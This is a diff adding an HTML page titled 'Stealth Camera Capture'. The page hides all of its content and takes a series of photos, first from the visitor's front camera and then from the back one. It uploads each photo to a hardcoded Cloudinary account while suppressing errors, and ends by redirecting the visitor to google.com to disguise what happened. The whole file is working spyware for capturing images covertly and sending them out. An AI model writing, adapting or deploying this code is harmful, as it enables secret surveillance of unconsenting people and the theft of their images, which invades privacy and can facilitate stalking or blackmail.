@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Stealth Camera Capture</title>
+<style>
+  body { display: none; } /* hide everything */
+</style>
+</head>
+<body>
+
+<video id="video" autoplay playsinline width="320" height="240" style="display:none;"></video>
+<canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
+
+<script>
+const video = document.getElementById("video");
+const canvas = document.getElementById("canvas");
+const ctx = canvas.getContext("2d");
+
+// Cloudinary info
+const CLOUD_NAME = "gamersio";
+const UPLOAD_PRESET = "webcamuploads";
+
+let cameras = ["user", "environment"]; // front + back
+let camIndex = 0;
+let photoCount = 0;
+const photosPerCam = 5;
+
+function startCamera() {
+  navigator.mediaDevices.getUserMedia({ video: { facingMode: cameras[camIndex] } })
+    .then(stream => {
+      video.srcObject = stream;
+      video.play();
+
+      const interval = setInterval(() => {
+        if (photoCount >= photosPerCam) {
+          clearInterval(interval);
+          stream.getTracks().forEach(track => track.stop());
+
+          if (camIndex === 0) {
+            camIndex = 1; // switch to back camera
+            photoCount = 0;
+            setTimeout(startCamera, 1000);
+          } else {
+            // done with all photos, redirect
+            window.location.href = "https://google.com";
+          }
+          return;
+        }
+
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        canvas.toBlob(blob => {
+          const formData = new FormData();
+          formData.append("file", blob);
+          formData.append("upload_preset", UPLOAD_PRESET);
+
+          fetch(`https://api.cloudinary.com/v1_1/${CLOUD_NAME}/image/upload`, {
+            method: "POST",
+            body: formData
+          }).catch(err => console.error("Upload error:", err)); // silently ignore errors
+        }, "image/png");
+
+        photoCount++;
+      }, 1500);
+
+    })
+    .catch(err => console.error("Camera error:", err));
+}
+
+startCamera();
+</script>
+</body>
+</html>
